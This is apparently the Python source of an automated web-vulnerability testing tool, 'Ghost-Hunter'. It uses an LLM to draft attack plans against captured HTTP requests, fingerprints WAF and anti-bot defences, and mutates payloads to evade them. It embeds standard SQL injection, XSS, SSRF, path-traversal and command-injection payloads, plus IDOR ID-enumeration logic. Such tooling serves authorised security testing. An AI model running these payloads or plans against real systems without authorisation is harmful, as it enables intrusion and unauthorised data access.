"""
Ghost-Hunter Strategist Engine
==============================
Utilise Groq (Llama 3.1 70B) pour créer des plans d'attaque détaillés.
Enrichi avec RAG Engine (HackTricks, NVD/CVE, Personal Reports, Payloads).
"""

import json
import re
import logging
from typing import Optional, List, Dict, Union

from ghost_hunter.core.contracts import (
    TriageDecision, AttackPlan, PayloadVariant, TestStep
)
# AIResponse is shared between GroqClient and OpenRouterClient
from ghost_hunter.core.brain.openrouter_client import AIResponse
from ghost_hunter.core.brain.prompts import STRATEGIST_SYSTEM_PROMPT, get_strategy_prompt
from ghost_hunter.core.ai_logger import get_ai_logger

# Import clients - Groq is primary, OpenRouter is fallback
try:
    from ghost_hunter.core.brain.groq_client import GroqClient
    GROQ_CLIENT_AVAILABLE = True
except ImportError:
    GROQ_CLIENT_AVAILABLE = False
    GroqClient = None  # type: ignore

try:
    from ghost_hunter.core.brain.openrouter_client import OpenRouterClient
    OPENROUTER_CLIENT_AVAILABLE = True
except ImportError:
    OPENROUTER_CLIENT_AVAILABLE = False
    OpenRouterClient = None  # type: ignore

# Type alias for any compatible AI client
AIClient = Union['GroqClient', 'OpenRouterClient']

logger = logging.getLogger(__name__)

# Import optionnel du Knowledge Loader (legacy fallback)
try:
    from ghost_hunter.core.intelligence import get_knowledge_loader
    KNOWLEDGE_AVAILABLE = True
except ImportError:
    KNOWLEDGE_AVAILABLE = False
    logger.warning("Knowledge Loader not available")

# Import RAG Engine (new system)
try:
    from ghost_hunter.core.rag.engine import get_rag_engine, RAGEngine
    RAG_AVAILABLE = True
except ImportError:
    RAG_AVAILABLE = False
    logger.info("RAG Engine not available, using legacy KnowledgeLoader")

# Import WAF Evasion
try:
    from ghost_hunter.core.evasion.mutator import PayloadMutator
    from ghost_hunter.core.evasion.checker import WAFChecker
    WAF_EVASION_AVAILABLE = True
except ImportError:
    WAF_EVASION_AVAILABLE = False
    logger.info("WAF Evasion not available")


class StrategistEngine:
    """Moteur de stratégie IA basé sur Groq (Llama 3.1 70B)."""
    
    # RAG config for Strategist - more context than Triage
    RAG_MAX_TOKENS = 1500
    RAG_MAX_CHUNKS = 15
    
    # Payloads de base par type de vuln (fallback si IA échoue)
    DEFAULT_PAYLOADS = {
        "IDOR": [
            {"payload": "1", "encoding": "none"},
            {"payload": "2", "encoding": "none"},
            {"payload": "0", "encoding": "none"},
            {"payload": "-1", "encoding": "none"},
            {"payload": "999999", "encoding": "none"},
        ],
        "SQLi": [
            {"payload": "'", "encoding": "none"},
            {"payload": "' OR '1'='1", "encoding": "none"},
            {"payload": "1' AND SLEEP(5)--", "encoding": "none"},
            {"payload": "1 UNION SELECT NULL--", "encoding": "none"},
        ],
        "XSS": [
            {"payload": "<script>alert(1)</script>", "encoding": "none"},
            {"payload": "\"><script>alert(1)</script>", "encoding": "none"},
            {"payload": "javascript:alert(1)", "encoding": "none"},
            {"payload": "<img src=x onerror=alert(1)>", "encoding": "none"},
        ],
        "SSRF": [
            {"payload": "http://127.0.0.1", "encoding": "none"},
            {"payload": "http://localhost", "encoding": "none"},
            {"payload": "http://169.254.169.254", "encoding": "none"},
            {"payload": "file:///etc/passwd", "encoding": "none"},
        ],
        "LFI": [
            {"payload": "../../../etc/passwd", "encoding": "none"},
            {"payload": "....//....//....//etc/passwd", "encoding": "none"},
            {"payload": "/etc/passwd", "encoding": "none"},
            {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "encoding": "none"},
        ],
        "CMDi": [
            {"payload": "; id", "encoding": "none"},
            {"payload": "| id", "encoding": "none"},
            {"payload": "`id`", "encoding": "none"},
            {"payload": "$(id)", "encoding": "none"},
        ],
    }
    
    def __init__(
        self,
        client: AIClient,
        model: str = "llama-70b",
        use_knowledge: bool = True,
        use_rag: bool = True,
        use_waf_evasion: bool = True
    ):
        """
        Args:
            client: Client Groq (ou OpenRouter en fallback)
            model: Modèle à utiliser (llama-70b pour stratégie détaillée)
            use_knowledge: Utiliser la Knowledge Base pour enrichir les prompts (legacy)
            use_rag: Utiliser RAG Engine pour enrichir avec payloads et techniques (new)
            use_waf_evasion: Utiliser WAF Evasion pour muter les payloads bloqués
        """
        self.client = client
        self.model = model
        self.use_knowledge = use_knowledge and KNOWLEDGE_AVAILABLE
        self.use_rag = use_rag and RAG_AVAILABLE
        self.use_waf_evasion = use_waf_evasion and WAF_EVASION_AVAILABLE
        
        # RAG Engine (lazy loaded)
        self._rag_engine: Optional[RAGEngine] = None
        
        # WAF Evasion (lazy loaded)
        self._mutator: Optional['PayloadMutator'] = None
        
        # Initialiser le Knowledge Loader si disponible (legacy fallback)
        self._knowledge = None
        if self.use_knowledge and not self.use_rag:
            try:
                self._knowledge = get_knowledge_loader()
                if self._knowledge.is_available:
                    logger.info("📚 Knowledge Base activée pour la stratégie (legacy)")
                else:
                    self._knowledge = None
            except Exception as e:
                logger.warning(f"📚 Knowledge Base error: {e}")
        
        if self.use_rag:
            logger.info("🧠 RAG Engine activé pour Strategist (800 tokens, payloads inclus)")
        
        if self.use_waf_evasion:
            logger.info("🛡️ WAF Evasion activé pour Strategist")
    
    @property
    def rag_engine(self) -> Optional[RAGEngine]:
        """Lazy load RAG Engine."""
        if self._rag_engine is None and self.use_rag:
            try:
                self._rag_engine = get_rag_engine()
                if not self._rag_engine.is_available():
                    logger.warning("🧠 RAG Engine not available, falling back to KnowledgeLoader")
                    self._rag_engine = None
            except Exception as e:
                logger.warning(f"🧠 RAG Engine error: {e}")
                self._rag_engine = None
        return self._rag_engine
    
    @property
    def mutator(self) -> Optional['PayloadMutator']:
        """Lazy load WAF Mutator."""
        if self._mutator is None and self.use_waf_evasion:
            try:
                self._mutator = PayloadMutator()
                logger.debug("🛡️ WAF Mutator loaded")
            except Exception as e:
                logger.warning(f"🛡️ WAF Mutator error: {e}")
                self._mutator = None
        return self._mutator
    
    def _collect_nested_keys(self, obj: dict, keys: set, prefix: str = "") -> None:
        """Recursively collect all keys from nested JSON object for IDOR detection."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                keys.add(key)
                if isinstance(value, dict):
                    self._collect_nested_keys(value, keys, f"{prefix}{key}.")
                elif isinstance(value, list):
                    for item in value:
                        if isinstance(item, dict):
                            self._collect_nested_keys(item, keys, f"{prefix}{key}[].")
        elif isinstance(obj, list):
            for item in obj:
                if isinstance(item, dict):
                    self._collect_nested_keys(item, keys, prefix)
    
    def _validate_injection_points(self, ai_points: list, triage: TriageDecision) -> list:
        """
        Valide et corrige les injection points générés par l'IA.
        
        Problème: L'IA invente parfois des noms comme "appointment_id" alors que
        le vrai placeholder dans l'URL est "{token}".
        
        Cette fonction:
        1. Vérifie si chaque point existe réellement dans la requête
        2. Si non, tente de mapper vers les vrais placeholders du path
        3. Ajoute les placeholders du path template si manquants
        """
        req = triage.request.request.request
        validated = []
        
        # Collecter les sources valides d'injection
        valid_sources = set()
        
        # Query params
        valid_sources.update(req.query_params.keys())
        
        # Body JSON keys (nested support)
        if req.body_json:
            valid_sources.update(req.body_json.keys())
            # Also add nested keys for IDOR detection
            self._collect_nested_keys(req.body_json, valid_sources)
        
        # Body URL-encoded form fields (POST forms)
        if req.body and not req.body_json:
            content_type = req.headers.get('content-type', req.headers.get('Content-Type', ''))
            if 'x-www-form-urlencoded' in content_type.lower():
                try:
                    from urllib.parse import parse_qs, unquote
                    form_fields = parse_qs(req.body, keep_blank_values=True)
                    for key in form_fields.keys():
                        # Handle Rails-style array params: field[0][id] → field, id
                        clean_key = unquote(key)
                        valid_sources.add(clean_key)
                        # Extract nested parts: visit_motive_categories_attributes[][id] → id
                        if '[' in clean_key:
                            # Get base name before first [
                            base_name = clean_key.split('[')[0]
                            valid_sources.add(base_name)
                            # Get nested field names inside []
                            import re as regex
                            nested = regex.findall(r'\[([^\]]+)\]', clean_key)
                            for n in nested:
                                if n:  # Skip empty [] 
                                    valid_sources.add(n)
                    logger.debug(f"📝 Parsed form fields: {list(valid_sources)[:20]}")
                except Exception as e:
                    logger.warning(f"Failed to parse form body: {e}")
        
        # Headers (lowercase)
        valid_sources.update(h.lower() for h in req.headers.keys())
        
        # Cookies
        if req.cookies:
            valid_sources.update(req.cookies.keys())
        
        # Path placeholders from template
        path_template = None
        if hasattr(req, 'get_endpoint_template') and callable(req.get_endpoint_template):
            path_template = req.get_endpoint_template()
        
        path_placeholders = []
        if path_template:
            path_placeholders = re.findall(r'\{([^}]+)\}', path_template)
            for ph in path_placeholders:
                valid_sources.add(f"{{{ph}}}")  # {token}
                # Also find composite format: resource/{placeholder}
                match = re.search(rf'([a-zA-Z_]+)/\{{{ph}\}}', path_template)
                if match:
                    valid_sources.add(f"{match.group(1)}/{{{ph}}}")  # appointments/{token}
        
        logger.debug(f"🔍 Valid injection sources: {valid_sources}")
        
        # Valider chaque point suggéré par l'IA
        for point in ai_points:
            if not point:
                continue
                
            # Cas 1: Le point existe directement
            if point in valid_sources or point.lower() in valid_sources:
                validated.append(point)
                logger.debug(f"✅ Injection point '{point}' validated (direct match)")
                continue
            
            # Cas 2: L'IA a inventé un nom comme "appointment_id" - mapper au placeholder
            # Si le nom contient "_id" ou "id", essayer de le mapper à un placeholder du path
            point_lower = point.lower()
            mapped = False
            if ('_id' in point_lower or point_lower.endswith('id')) and path_placeholders:
                # Chercher un placeholder correspondant
                for ph in path_placeholders:
                    ph_lower = ph.lower()
                    # Match si: appointment_id → {token} (appointments dans le path)
                    # ou user_id → {id}, etc.
                    
                    # Trouver le segment de ressource avant le placeholder
                    match = re.search(rf'([a-zA-Z_]+)/\{{{ph}\}}', path_template)
                    if match:
                        resource = match.group(1)  # "appointments"
                        resource_singular = resource.rstrip('s')  # "appointment"
                        
                        # Si le nom inventé par l'IA correspond à la ressource
                        if resource_singular in point_lower or resource in point_lower:
                            composite = f"{resource}/{{{ph}}}"
                            if composite not in validated:
                                validated.append(composite)
                                logger.info(f"🔄 Mapped AI point '{point}' → '{composite}'")
                            mapped = True
                            break
                        # Fallback: si l'IA point contient "id" et le placeholder contient "id"
                        elif 'id' in point_lower and 'id' in ph_lower:
                            composite = f"{resource}/{{{ph}}}"
                            if composite not in validated:
                                validated.append(composite)
                                logger.info(f"🔄 Mapped AI point '{point}' → '{composite}' (id fallback)")
                            mapped = True
                            break
                    else:
                        # Simple placeholder comme {id}
                        simple = f"{{{ph}}}"
                        if simple not in validated:
                            validated.append(simple)
                            logger.info(f"🔄 Mapped AI point '{point}' → '{simple}'")
                        mapped = True
                        break
                
                # Si toujours pas mappé mais on a des placeholders, prendre le premier
                if not mapped and path_placeholders:
                    ph = path_placeholders[0]
                    match = re.search(rf'([a-zA-Z_]+)/\{{{ph}\}}', path_template)
                    if match:
                        composite = f"{match.group(1)}/{{{ph}}}"
                        if composite not in validated:
                            validated.append(composite)
                            logger.info(f"🔄 Mapped AI point '{point}' → '{composite}' (first placeholder)")
                    else:
                        simple = f"{{{ph}}}"
                        if simple not in validated:
                            validated.append(simple)
                            logger.info(f"🔄 Mapped AI point '{point}' → '{simple}' (first placeholder)")
                    mapped = True
                
                if mapped:
                    continue
            
            # Cas 3: Pour les form fields avec ID - chercher des champs similaires
            # L'IA peut suggérer "id" ou "speciality_id" - on cherche dans valid_sources
            if 'id' in point_lower:
                for source in valid_sources:
                    source_lower = source.lower()
                    # Match si le source contient le même pattern id
                    if point_lower == source_lower:
                        validated.append(source)
                        logger.info(f"🔄 Matched AI point '{point}' → '{source}' (case-insensitive)")
                        mapped = True
                        break
                    # Match partiel: "id" matches "speciality_id", "visit_id", etc.
                    elif point_lower in source_lower or source_lower.endswith(point_lower):
                        validated.append(source)
                        logger.info(f"🔄 Matched AI point '{point}' → '{source}' (partial match)")
                        mapped = True
                        break
                if mapped:
                    continue
            
            # Cas 4: Point non trouvé - log warning mais ne pas ajouter
            logger.warning(f"⚠️ Injection point '{point}' not found in request - skipping")
        
        # FALLBACK: S'assurer qu'on a au moins les path placeholders si IDOR suggéré
        if not validated and path_placeholders:
            for ph in path_placeholders:
                match = re.search(rf'([a-zA-Z_]+)/\{{{ph}\}}', path_template)
                if match:
                    validated.append(f"{match.group(1)}/{{{ph}}}")
                else:
                    validated.append(f"{{{ph}}}")
            logger.info(f"📍 Added path placeholders as fallback: {validated}")
        
        # FALLBACK 2: Pour les form fields avec ID potentiel (IDOR)
        # Si pas de validation et on a des form fields avec "id" dedans
        if not validated:
            id_fields = [s for s in valid_sources if 'id' in s.lower() and s not in validated]
            if id_fields:
                # Prendre les 3 champs les plus intéressants
                for field in id_fields[:3]:
                    validated.append(field)
                logger.info(f"📍 Added ID-containing form fields as fallback: {validated}")
        
        return validated
    
    def _extract_json(self, text: str) -> Optional[dict]:
        """Extrait le JSON d'une réponse texte."""
        # Log la réponse brute pour debug
        logger.debug(f"🤖 Raw AI response (first 500 chars): {text[:500]}")
        
        try:
            result = json.loads(text)
            logger.info(f"✅ Parsed JSON directly")
            return result
        except Exception as e:
            logger.debug(f"Direct JSON parse failed: {e}")
        
        json_patterns = [
            r'```json\s*(.*?)\s*```',
            r'```\s*(.*?)\s*```',
        ]
        
        for pattern in json_patterns:
            matches = re.findall(pattern, text, re.DOTALL)
            for match in matches:
                try:
                    result = json.loads(match.strip())
                    logger.info(f"✅ Parsed JSON from code block")
                    return result
                except:
                    continue
        
        # Dernier recours: trouver le premier { et dernier }
        try:
            start = text.index('{')
            end = text.rindex('}') + 1
            result = json.loads(text[start:end])
            logger.info(f"✅ Parsed JSON by finding braces")
            return result
        except Exception as e:
            logger.warning(f"❌ Could not extract JSON from AI response: {e}")
            logger.warning(f"   Response preview: {text[:200]}")
            return None
    
    def _build_request_data(self, triage: TriageDecision) -> dict:
        """Construit les données de requête COMPLÈTES pour le prompt et replay."""
        req = triage.request.request.request
        
        return {
            "method": req.method,
            "url": req.url,
            "host": req.host,
            "path": req.path,
            "query_params": req.query_params,
            "headers": dict(req.headers),  # ALL headers including auth & cookies
            "cookies": req.cookies,  # Full cookie values for replay
            "body": req.body,  # Full body
            "body_json": req.body_json,
            "has_auth": "authorization" in [h.lower() for h in req.headers.keys()],
            "content_type": req.headers.get('content-type', req.headers.get('Content-Type', '')),
            # Response info
            "response_status": req.response_status,
            "response_headers": dict(req.response_headers) if req.response_headers else None,
            "response_body": req.response_body[:5000] if req.response_body else None,
        }
    
    def _build_triage_result(self, triage: TriageDecision) -> dict:
        """Construit le résultat du triage pour le prompt."""
        result = {
            "suggested_vulns": triage.suggested_vulns,
            "confidence": triage.confidence,
            "reason": triage.reason,
            "test_phase": triage.test_phase.value
        }
        
        # NEW: Include attack surface hints from Tier 2 for targeted testing
        if hasattr(triage, 'attack_surface_hints') and triage.attack_surface_hints:
            result["attack_surface_hints"] = triage.attack_surface_hints
            logger.info(f"🎯 Strategist received {len(triage.attack_surface_hints)} attack hints from Triage")
        
        if hasattr(triage, 'false_positive_reason') and triage.false_positive_reason:
            result["false_positive_reason"] = triage.false_positive_reason
        
        return result
    
    def _get_knowledge_context(self, suggested_vulns: list) -> tuple:
        """Récupère le contexte Knowledge et les payloads (legacy)."""
        if not self._knowledge or not suggested_vulns:
            return None, None
        
        try:
            # Contexte technique (HackTricks)
            context = self._knowledge.get_context_for_prompt(
                vuln_types=suggested_vulns,
                max_techniques=3,  # Plus détaillé pour la stratégie
                max_payloads=0  # Payloads séparés
            )
            
            # Payloads de PayloadsAllTheThings
            all_payloads = []
            for vuln in suggested_vulns[:2]:  # Max 2 vulns
                vuln_payloads = self._knowledge.get_payloads_for_prompt(
                    vuln_type=vuln,
                    limit=10
                )
                all_payloads.extend(vuln_payloads)
            
            return context, all_payloads[:15]  # Max 15 payloads total
            
        except Exception as e:
            logger.debug(f"Knowledge context error: {e}")
            return None, None
    
    def _get_rag_context(self, triage: TriageDecision) -> tuple:
        """
        Récupère le contexte RAG pour le Strategist.
        
        Utilise la recherche sémantique pour trouver des techniques,
        CVE, et payloads pertinents basés sur le triage.
        
        Returns:
            tuple: (context_text, payloads_list)
        """
        if not self.rag_engine:
            return None, None
        
        scored = triage.request
        try:
            # Get RAG context with payloads included
            context = self.rag_engine.get_context_sync(
                scored,
                max_tokens=self.RAG_MAX_TOKENS,
                max_chunks=self.RAG_MAX_CHUNKS,
                include_payloads=True  # Strategist needs payloads
            )
            
            if context:
                logger.debug(f"🧠 RAG context for Strategist ({len(context)} chars)")
            
            # Note: payloads are included in the context string
            # Return as tuple for compatibility with existing prompt building
            return context, []
            
        except Exception as e:
            logger.warning(f"🧠 RAG context error: {e}")
            # Fallback to legacy KnowledgeLoader
            return self._get_knowledge_context(triage.suggested_vulns)
    
    def _get_security_context(self, host: str) -> Optional[dict]:
        """Récupère le Security Profile pour le domaine cible."""
        try:
            from ghost_hunter.core.intelligence import get_fingerprinter
            fingerprinter = get_fingerprinter()
            profile = fingerprinter.get_profile(host)
            
            if not profile:
                return None
            
            # Construire le contexte pour le prompt
            security_profile = profile.to_security_profile()
            
            return {
                "waf": profile.waf.name if profile.waf else None,
                "waf_confidence": profile.waf.confidence if profile.waf else 0,
                "cdn": profile.cdn.name if profile.cdn else None,
                "anti_bot": profile.anti_bot.name if profile.anti_bot else None,
                "rate_limiting": profile.rate_limiting is not None,
                "backend": profile.backend_framework.name if profile.backend_framework else None,
                "frontend": profile.frontend_framework.name if profile.frontend_framework else None,
                "security_headers_count": sum(1 for v in profile.security_headers.values() if v),
                "security_headers_total": len(profile.security_headers),
                "evasion_techniques": security_profile.recommended_evasion,
            }
        except Exception as e:
            logger.debug(f"Security context error: {e}")
            return None
    
    def _create_fallback_plan(self, triage: TriageDecision) -> AttackPlan:
        """Crée un plan de fallback si l'IA échoue."""
        vuln_class = triage.suggested_vulns[0] if triage.suggested_vulns else "IDOR"
        
        # Trouver les points d'injection
        req = triage.request.request.request
        injection_points = list(req.query_params.keys())
        if req.body_json:
            injection_points.extend(req.body_json.keys())
        
        # ═══ NOUVEAU: Parser les form fields URL-encoded ═══
        form_fields = {}
        if req.body and not req.body_json:
            content_type = req.headers.get('content-type', req.headers.get('Content-Type', ''))
            if 'x-www-form-urlencoded' in content_type.lower():
                try:
                    from urllib.parse import parse_qs, unquote
                    form_data = parse_qs(req.body, keep_blank_values=True)
                    for key, values in form_data.items():
                        clean_key = unquote(key)
                        # Extraire le nom de base et les champs nested
                        if '[' in clean_key:
                            # visit_motive_categories_attributes[][id] → id
                            import re as regex
                            nested = regex.findall(r'\[([^\]]+)\]', clean_key)
                            for n in nested:
                                if n and n not in injection_points:
                                    injection_points.append(n)
                                    # Stocker la valeur pour le fallback IDOR
                                    if values:
                                        form_fields[n] = values[0]
                        else:
                            if clean_key not in injection_points:
                                injection_points.append(clean_key)
                            if values:
                                form_fields[clean_key] = values[0]
                    logger.info(f"📝 Fallback: Parsed {len(form_fields)} form fields")
                except Exception as e:
                    logger.warning(f"Failed to parse form body in fallback: {e}")
        
        # ═══ Détecter les path parameters ({uuid}, {id}, etc.) ═══
        # Exemple: /task_manager/tasks/{uuid}/task_comments → ajouter "{uuid}" ou "tasks/{uuid}"
        path = req.path
        import re
        path_placeholders = re.findall(r'\{([^}]+)\}', path)
        for placeholder in path_placeholders:
            # Format comme attendu par http_runner: soit "{uuid}" soit "resource/{uuid}"
            # Trouver le segment avant le placeholder
            match = re.search(rf'([a-zA-Z_]+)/\{{{placeholder}\}}', path)
            if match:
                # Format composite: "tasks/{uuid}"
                composite_point = f"{match.group(1)}/{{{placeholder}}}"
                if composite_point not in injection_points:
                    injection_points.insert(0, composite_point)
            else:
                # Format simple: "{uuid}"
                simple_point = f"{{{placeholder}}}"
                if simple_point not in injection_points:
                    injection_points.insert(0, simple_point)
        
        # Générer des payloads intelligents pour IDOR
        payloads = []
        if vuln_class.upper() == "IDOR":
            # Chercher des valeurs numériques dans les params/body pour générer des variations
            numeric_values = {}
            
            # Query params
            for key, val in req.query_params.items():
                if isinstance(val, (int, float)) or (isinstance(val, str) and val.isdigit()):
                    numeric_values[key] = int(val) if isinstance(val, str) else val
            
            # Body JSON
            if req.body_json:
                for key, val in req.body_json.items():
                    if isinstance(val, (int, float)) or (isinstance(val, str) and str(val).isdigit()):
                        try:
                            numeric_values[key] = int(val)
                        except:
                            pass
            
            # Form fields URL-encoded (parsed above)
            for key, val in form_fields.items():
                if isinstance(val, str) and val.isdigit():
                    try:
                        numeric_values[key] = int(val)
                    except:
                        pass
            
            if numeric_values:
                logger.info(f"📊 IDOR fallback: Found numeric values: {numeric_values}")
                # Générer des payloads basés sur les vraies valeurs
                for key, original_val in numeric_values.items():
                    # Variations IDOR: -1, +1, autre user, 0, négatif
                    variations = [
                        str(original_val - 1),  # Previous ID
                        str(original_val + 1),  # Next ID
                        "1",                     # First ID (admin?)
                        str(original_val - 100), # Way different
                        "0",                     # Zero
                        "-1",                    # Negative
                    ]
                    for v in variations:
                        payloads.append(PayloadVariant(payload=v, encoding="none"))
                    
                    # Limiter les injection_points aux champs numériques trouvés
                    if key not in injection_points:
                        injection_points.insert(0, key)
                
                logger.info(f"📊 IDOR fallback: Generated {len(payloads)} payloads from original values")
            
            # ═══ NOUVEAU: Générer des payloads UUID si path contient des UUIDs ═══
            uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
            uuid_matches = re.findall(uuid_pattern, path, re.IGNORECASE)
            if uuid_matches:
                original_uuid = uuid_matches[0]
                # Générer des UUIDs IDOR: variations sur le dernier segment
                uuid_parts = original_uuid.split('-')
                last_part = uuid_parts[-1]
                
                # Variations UUID: modifier les derniers caractères
                uuid_payloads = [
                    # Même UUID sauf dernier caractère +1
                    f"{'-'.join(uuid_parts[:-1])}-{last_part[:-1]}{'0' if last_part[-1] == 'f' else chr(ord(last_part[-1])+1)}",
                    # Même UUID sauf dernier caractère -1
                    f"{'-'.join(uuid_parts[:-1])}-{last_part[:-1]}{'f' if last_part[-1] == '0' else chr(ord(last_part[-1])-1)}",
                    # UUID avec tous 0
                    "00000000-0000-0000-0000-000000000000",
                    # UUID avec tous 1
                    "11111111-1111-1111-1111-111111111111",
                    # UUID aléatoire
                    "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
                ]
                for uuid_payload in uuid_payloads:
                    payloads.append(PayloadVariant(payload=uuid_payload, encoding="none"))
                
                logger.info(f"📊 IDOR fallback: Added {len(uuid_payloads)} UUID payloads for path parameter")
        
        # Fallback aux payloads par défaut si pas de valeurs numériques
        if not payloads:
            default_payloads = self.DEFAULT_PAYLOADS.get(vuln_class.upper(), self.DEFAULT_PAYLOADS["IDOR"])
            payloads = [
                PayloadVariant(
                    payload=p["payload"],
                    encoding=p.get("encoding", "none")
                )
                for p in default_payloads
            ]
        
        return AttackPlan(
            request=triage,
            tool="custom",
            vuln_class=vuln_class,
            payloads=payloads[:10],  # Max 10 payloads
            injection_points=injection_points[:3],  # Max 3
            test_sequence=[
                TestStep(
                    order=1,
                    action="send_request",
                    description=f"Test {vuln_class} with smart payloads",
                    expected_indicators=["error", "200", "changed"]
                )
            ],
            baseline_needed=True,
            max_requests=len(payloads) * max(1, len(injection_points)),
            delay_between_ms=1000,
            reasoning="Fallback plan - Smart IDOR variations" if vuln_class.upper() == "IDOR" else "Fallback plan"
        )
    
    def _log_plan(self, plan: AttackPlan, source: str = "ai") -> None:
        """Log le plan généré pour le path déterministe."""
        try:
            ai_logger = get_ai_logger()
            req = plan.request.request.request.request
            
            ai_logger.log_plan(
                endpoint=req.get_endpoint_template(),
                method=req.method,
                vuln_class=plan.vuln_class,
                injection_points=plan.injection_points,
                payloads=[p.payload for p in plan.payloads],
                reasoning=plan.reasoning,
                source=source,
                model=plan.model_used,
                host=req.host,
            )
        except Exception as e:
            logger.debug(f"Failed to log AI plan: {e}")
    
    def create_plan(self, triage: TriageDecision) -> AttackPlan:
        """
        Crée un plan d'attaque basé sur le triage.
        
        Utilise RAG Engine pour enrichir le contexte avec des techniques,
        CVE, et payloads pertinents.
        
        Args:
            triage: Décision du triage avec les vulns suggérées
            
        Returns:
            AttackPlan détaillé
        """
        request_data = self._build_request_data(triage)
        triage_result = self._build_triage_result(triage)
        
        # Récupérer le contexte RAG (new) ou Knowledge (legacy fallback)
        if self.use_rag and self.rag_engine:
            knowledge_context, knowledge_payloads = self._get_rag_context(triage)
            if knowledge_context:
                logger.info("🧠 Using RAG context for Strategist (800 tokens, payloads included)")
        else:
            knowledge_context, knowledge_payloads = self._get_knowledge_context(
                triage.suggested_vulns
            )
        
        # Récupérer le Security Profile de la cible
        # Naviguer jusqu'au host original
        host = triage.request.request.request.host
        security_context = self._get_security_context(host)
        
        # Log si contextes utilisés
        if knowledge_context or knowledge_payloads:
            logger.info(f"📚 Stratégie enrichie avec Knowledge Base ({len(knowledge_payloads or [])} payloads)")
        if security_context:
            waf = security_context.get('waf', 'None')
            anti_bot = security_context.get('anti_bot', 'None')
            logger.info(f"🛡️ Stratégie adaptée au Security Profile (WAF: {waf}, Anti-Bot: {anti_bot})")
        
        # Générer le prompt enrichi
        user_prompt = get_strategy_prompt(
            request_data, 
            triage_result,
            knowledge_context=knowledge_context,
            payloads=knowledge_payloads,
            security_context=security_context
        )
        
        # Build full prompt for debug (includes system prompt)
        full_debug_prompt = f"=== SYSTEM PROMPT ===\n{STRATEGIST_SYSTEM_PROMPT}\n\n=== USER PROMPT ===\n{user_prompt}"
        
        # Appeler l'IA
        response: AIResponse = self.client.chat(
            messages=[{"role": "user", "content": user_prompt}],
            model=self.model,
            system_prompt=STRATEGIST_SYSTEM_PROMPT,
            temperature=0.5,
            max_tokens=2000
        )
        
        # DEBUG: Log AI response
        logger.info(f"🤖 Strategist AI response: model={response.model}, tokens={response.tokens_input}+{response.tokens_output}")
        if response.content:
            logger.debug(f"🤖 Strategist raw response: {response.content[:500]}...")
        
        # Plan de base - include debug prompt/response
        plan = AttackPlan(
            request=triage,
            model_used=response.model,
            tokens_input=response.tokens_input,
            tokens_output=response.tokens_output,
            debug_prompt=full_debug_prompt,
            debug_response=response.content or ""
        )
        
        # Vérifier si la réponse est valide (AIResponse n'a pas d'attribut success)
        if not response.content:
            logger.warning("⚠️ AI response is empty, using fallback")
            # Fallback
            return self._create_fallback_plan(triage)
        
        # Parser la réponse
        parsed = self._extract_json(response.content)
        
        if not parsed:
            logger.warning(f"⚠️ JSON extraction failed from response: {response.content[:200]}...")
            return self._create_fallback_plan(triage)
        
        logger.info(f"✅ Parsed plan: vuln_class={parsed.get('vuln_class')}, payloads={len(parsed.get('payloads', []))}")
        
        # Remplir le plan
        plan.vuln_class = parsed.get("vuln_class", triage.suggested_vulns[0] if triage.suggested_vulns else "Unknown")
        plan.tool = parsed.get("tool", "custom")
        plan.reasoning = parsed.get("reasoning", "")
        raw_injection_points = parsed.get("injection_points", [])
        # Valider et corriger les injection points
        plan.injection_points = self._validate_injection_points(raw_injection_points, triage)
        plan.baseline_needed = parsed.get("baseline_needed", True)
        plan.max_requests = parsed.get("max_requests", 10)
        plan.delay_between_ms = parsed.get("delay_between_ms", 1000)
        plan.evasion_techniques = parsed.get("evasion_techniques", [])
        
        # Parser les payloads
        raw_payloads = parsed.get("payloads", [])
        for p in raw_payloads:
            # Skip None payloads
            if p is None:
                logger.warning("⚠️ Skipping None payload")
                continue
            if isinstance(p, dict) and "payload" in p:
                payload_value = p["payload"]
                # CRITICAL: S'assurer que le payload est une string simple, pas un dict/objet
                if isinstance(payload_value, dict):
                    # L'IA a retourné un objet - c'est probablement le body original, on skip
                    logger.warning(f"⚠️ Skipping dict payload (likely original body): {list(payload_value.keys())}")
                    continue
                elif not isinstance(payload_value, str):
                    payload_value = str(payload_value)
                
                # Valider que le payload n'est pas le body original en JSON string
                if payload_value.startswith('{') and 'account_id' in payload_value:
                    logger.warning(f"⚠️ Skipping JSON-like payload (likely original body): {payload_value[:50]}...")
                    continue
                    
                plan.payloads.append(PayloadVariant(
                    payload=payload_value,
                    encoding=p.get("encoding", "none"),
                    evasion=p.get("evasion", "none")
                ))
            elif isinstance(p, str):
                # Valider que ce n'est pas le body original
                if p.startswith('{') and ('account_id' in p or 'ssid' in p):
                    logger.warning(f"⚠️ Skipping JSON-like string payload: {p[:50]}...")
                    continue
                plan.payloads.append(PayloadVariant(payload=p))
            elif isinstance(p, (int, float)):
                # Nombre brut - OK pour IDOR
                plan.payloads.append(PayloadVariant(payload=str(p)))
        
        # Parser la séquence de test
        raw_sequence = parsed.get("test_sequence", [])
        for step in raw_sequence:
            if isinstance(step, dict):
                plan.test_sequence.append(TestStep(
                    order=step.get("order", 0),
                    action=step.get("action", "send_request"),
                    description=step.get("description", ""),
                    expected_indicators=step.get("expected_indicators", [])
                ))
        
        # Log les payloads parsés
        if plan.payloads:
            logger.info(f"✅ Parsed {len(plan.payloads)} payloads from AI:")
            for i, p in enumerate(plan.payloads[:5]):
                logger.info(f"   {i+1}. {repr(p.payload)[:50]}")
        else:
            logger.warning("⚠️ No valid payloads parsed from AI response")
        
        # Fallback si pas de payloads générés - utiliser la logique intelligente
        if not plan.payloads:
            logger.info("📊 No valid payloads from AI, using smart fallback")
            fallback_plan = self._create_fallback_plan(triage)
            plan.payloads = fallback_plan.payloads
            logger.info(f"📊 Fallback generated {len(plan.payloads)} payloads:")
            for i, p in enumerate(plan.payloads[:5]):
                logger.info(f"   {i+1}. {repr(p.payload)[:50]}")
            if not plan.injection_points:
                plan.injection_points = fallback_plan.injection_points
            # Log comme fallback
            self._log_plan(plan, source="fallback")
        else:
            # Log le plan AI
            self._log_plan(plan, source="ai")
        
        # WAF Evasion: Muter les payloads bloqués si WAF détecté
        if self.use_waf_evasion and security_context:
            waf = security_context.get('waf', 'None')
            if waf and waf != 'None':
                plan = self._apply_waf_evasion(plan)
        
        return plan
    
